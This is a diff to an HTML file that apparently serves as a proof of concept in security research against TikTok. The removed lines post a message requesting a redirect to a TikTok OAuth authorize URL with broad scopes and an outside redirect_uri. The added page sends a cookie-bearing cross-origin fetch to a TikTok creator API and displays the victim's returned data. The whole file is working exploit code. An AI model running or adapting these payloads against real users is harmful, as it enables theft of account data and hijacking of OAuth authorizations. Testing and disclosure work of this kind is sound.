@@ -1,7 +1,45 @@
-<script>
-parent.postMessage({
-  action: "requestRedirectionTo",
-  targetUrlStr: "https://www.tiktok.com/v2/auth/authorize?client_key=7480799711721439248&scope=biz.brand.insights%2Ccomment.list%2Cuser.info.basic%2Cuser.info.username%2Cuser.info.stats%2Cuser.info.profile%2Cuser.account.type%2Cuser.insights%2Cvideo.list%2Cvideo.insights%2Ccomment.list.manage%2Cvideo.publish%2Cvideo.upload%2Cbiz.spark.auth%2Cdiscovery.search.words%2Cbiz.ads.recommend%2Cbiz.creator.info%2Cbiz.creator.insights%2Ctcm.order.update%2Ctto.campaign.link&response_type=code&redirect_uri=https%3A%2F%2Fimran.com"
-}, "*");
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>CORS PoC with JSON Pretty-Print</title>
+</head>
+<body>
+  <h1>CORS PoC (JSON Pretty-Print)</h1>
+  <p>
+    This page will attempt to send an authenticated cross-origin request to
+    <strong>https://www.tiktok.com/CreativeOne/OrderQuery/CreatorGetPostItemList?limit=12&amp;page=1</strong>
+    and display the returned JSON in a pretty-printed format below.
+  </p>
 
-</script>
+  <button id="pocButton">Send Cross-Origin Request</button>
+
+  <!-- A container to hold our JSON output -->
+  <pre id="responseBox" style="border:1px solid #ccc; padding:1em; white-space:pre-wrap;"></pre>
+
+  <script>
+    document.getElementById('pocButton').addEventListener('click', function() {
+      fetch("https://www.tiktok.com/CreativeOne/OrderQuery/CreatorGetPostItemList?limit=12&page=1", {
+        method: "GET",
+        credentials: "include"  // <-- ensures cookies are sent
+      })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error("HTTP error, status = " + response.status);
+        }
+        return response.json(); // parse JSON directly
+      })
+      .then(data => {
+        // Pretty-print JSON
+        const prettyJson = JSON.stringify(data, null, 2);
+        document.getElementById('responseBox').textContent = prettyJson;
+        console.log("Response Data:", data);
+      })
+      .catch(error => {
+        console.error("Request failed:", error);
+        document.getElementById('responseBox').textContent = "Request failed: " + error;
+      });
+    });
+  </script>
+</body>
+</html>
